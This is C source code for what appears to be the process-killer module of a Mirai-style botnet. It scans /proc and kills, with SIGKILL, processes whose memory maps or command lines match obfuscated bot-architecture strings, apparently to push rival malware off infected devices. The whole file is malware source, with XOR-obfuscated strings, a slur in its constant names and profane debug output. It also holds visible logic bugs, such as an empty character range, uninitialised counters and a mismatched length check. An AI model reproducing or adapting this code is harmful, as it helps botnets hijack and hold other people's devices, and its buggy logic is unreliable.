#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "h/i.h"
#include "h/k.h"
#include "h/x.h"
#include "h/u.h"
int killer_pid, killer_realpath_len = 0;
char *killer_realpath;
void killer_init(void){
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL);
    uint32_t scan_counter = 0;
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;
    sleep(5);
#ifdef DEBUG
    printf("[killer] cmdline killer started, scanning for bad processes!\n");
#endif
    while (TRUE){
        DIR *dir;
        struct dirent *file;
        t_u_v(RAPE_K_PROC);
        if ((dir = opendir(t_r_v(RAPE_K_PROC, NULL))) == NULL){
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n");
#endif
            break;
        }
        t_l_v(RAPE_K_PROC);
        while ((file = readdir(dir)) != NULL){
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;
            char cmdline_path[64], *ptr_cmdline_path = cmdline_path, maps_path[64], *ptr_maps_path = maps_path;
            int rp_len, fd, pid = atoi(file->d_name);
            scan_counter++;
            if (pid <= killer_highest_pid){
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME){
#ifdef DEBUG
                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                } else{
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);
            t_u_v(RAPE_K_PROC);
            t_u_v(RAPE_K_CMDLINE);
            t_u_v(RAPE_K_MAPS);
            ptr_cmdline_path += util_strcpy(ptr_cmdline_path, t_r_v(RAPE_K_PROC, NULL));
            ptr_cmdline_path += util_strcpy(ptr_cmdline_path, file->d_name);
            ptr_cmdline_path += util_strcpy(ptr_cmdline_path, t_r_v(RAPE_K_CMDLINE, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, t_r_v(RAPE_K_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, t_r_v(RAPE_K_MAPS, NULL));
            t_l_v(RAPE_K_PROC);
            t_l_v(RAPE_K_CMDLINE);
            t_l_v(RAPE_K_MAPS);
            if(pid != getpid() && pid != getppid() && pid != getpid() + 1){
                if(maps_match_scan(maps_path) == TRUE){

                     #ifdef DEBUG
                printf("[killer] killed the fucking bin: %s\n", maps_path);
                sleep(5);
                system("clear");
#endif
                    kill(pid, 9);
                }
            }
            if(cmdline_match_scan(cmdline_path) == TRUE){

                 #ifdef DEBUG
                printf("[cmdline_killer] killed the fucking bin: %s\n", cmdline_path);
                 sleep(5);
                system("clear");
#endif
                kill(pid, 9);
            }
            util_zero(cmdline_path, sizeof (cmdline_path));
            util_zero(maps_path, sizeof (maps_path));
        }
        closedir(dir);
    }
#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}
void killer_kill(void){
    kill(killer_pid, 9);
}
static BOOL maps_match_scan(char *path){
    int fd, ret;
    char rdbuf[4096];
    BOOL found = FALSE;
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
#ifdef DEBUG
    printf("[maps_killer] scanned [%s]\n", path);
#endif
    t_l_v(T_K_mips);
    t_l_v(T_K_mpsl);
    t_l_v(T_K_sh4);
    t_l_v(T_K_x86);
    t_l_v(T_K_arm6);
    t_l_v(T_K_i686);
    t_l_v(T_K_ppc);
    t_l_v(T_K_i586);
    t_l_v(T_K_m68k);
    t_l_v(T_K_spc);
    t_l_v(T_K_arm);
    t_l_v(T_K_arm5);
    t_l_v(T_K_ppc440);
    t_l_v(T_K_arm7);
    t_l_v(T_K_arc);
    t_l_v(T_K_mips64);
    t_l_v(T_K_arm4);
    t_l_v(T_K_arm3);
    t_l_v(T_K_x86_32);
    //t_u_v(XOR_KRONOS);
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0){
        if(mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_mpsl, NULL), util_strlen(t_r_v(T_K_mpsl, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_sh4, NULL), util_strlen(t_r_v(T_K_sh4, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_x86, NULL), util_strlen(t_r_v(T_K_x86, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm6, NULL), util_strlen(t_r_v(T_K_arm6, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_i686, NULL), util_strlen(t_r_v(T_K_i686, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_ppc, NULL), util_strlen(t_r_v(T_K_ppc, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_i586, NULL), util_strlen(t_r_v(T_K_i586, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_m68k, NULL), util_strlen(t_r_v(T_K_m68k, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_spc, NULL), util_strlen(t_r_v(T_K_spc, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm, NULL), util_strlen(t_r_v(T_K_arm, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm5, NULL), util_strlen(t_r_v(T_K_arm5, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_ppc440, NULL), util_strlen(t_r_v(T_K_ppc440, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm7, NULL), util_strlen(t_r_v(T_K_arm7, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arc, NULL), util_strlen(t_r_v(T_K_arc, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_mips64, NULL), util_strlen(t_r_v(T_K_mips64, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm4, NULL), util_strlen(t_r_v(T_K_arm4, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_arm3, NULL), util_strlen(t_r_v(T_K_arm4, NULL))) ||
            mem_exists(rdbuf, util_strlen(rdbuf), t_r_v(T_K_x86_32, NULL), util_strlen(t_r_v(T_K_x86_32, NULL))))
            found = TRUE;
    close(fd);
    t_l_v(T_K_mips);
    t_l_v(T_K_mpsl);
    t_l_v(T_K_sh4);
    t_l_v(T_K_x86);
    t_l_v(T_K_arm6);
    t_l_v(T_K_i686);
    t_l_v(T_K_ppc);
    t_l_v(T_K_i586);
    t_l_v(T_K_m68k);
    t_l_v(T_K_spc);
    t_l_v(T_K_arm);
    t_l_v(T_K_arm5);
    t_l_v(T_K_ppc440);
    t_l_v(T_K_arm7);
    t_l_v(T_K_arc);
    t_l_v(T_K_mips64);
    t_l_v(T_K_arm4);
    t_l_v(T_K_arm3);
    t_l_v(T_K_x86_32);
    return found;
    }
}



static BOOL cmdline_match_scan(char *path){
    int fd, ret, ii, s, curr_points = 0, num_alphas, num_count, points_to_kill = 3;
    char rdbuf[4096];
    BOOL found = FALSE;
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
    #ifdef DEBUG
    printf("[cmdline_killer] scanned [%s]\n", path);
#endif
    t_u_v(XOR_DOT);
    t_u_v(XOR_SDA);
    t_u_v(XOR_MTD);
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0){
        if(mem_exists(rdbuf, ret, t_r_v(XOR_DOT, NULL), util_strlen(t_r_v(XOR_DOT, NULL))))
            found = TRUE;
        if(!mem_exists(rdbuf, ret, t_r_v(XOR_SDA, NULL), util_strlen(t_r_v(XOR_SDA, NULL))) && 
           !mem_exists(rdbuf, ret, t_r_v(XOR_MTD, NULL), util_strlen(t_r_v(XOR_MTD, NULL)))){
            for (ii = 0; ii < ret; ii++){
                if(s == 0){
                    if ((rdbuf[ii] >= 'a' && rdbuf[ii] <= 'Z')){
                        if(curr_points >= 5)
                            curr_points++;
                        s = 1;
                        num_alphas++;
                    }   
                }
                else if (rdbuf[ii] >= '0' && rdbuf[ii] <= '9'){
                    s = 0;
                    curr_points++;
                    num_count++;
                }
            }
            if (curr_points >= points_to_kill){
                found = TRUE;
            }
        }
    }
    close(fd);
    t_l_v(XOR_DOT);
    t_l_v(XOR_SDA);
    t_l_v(XOR_MTD);
    return found;
}
static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len){
    int matches = 0;
    if (str_len > buf_len)
        return FALSE;
    while (buf_len--){
        if (*buf++ == str[matches]){
            if (++matches == str_len)
                return TRUE;
        } else
        matches = 0;
    }
    return FALSE;
}
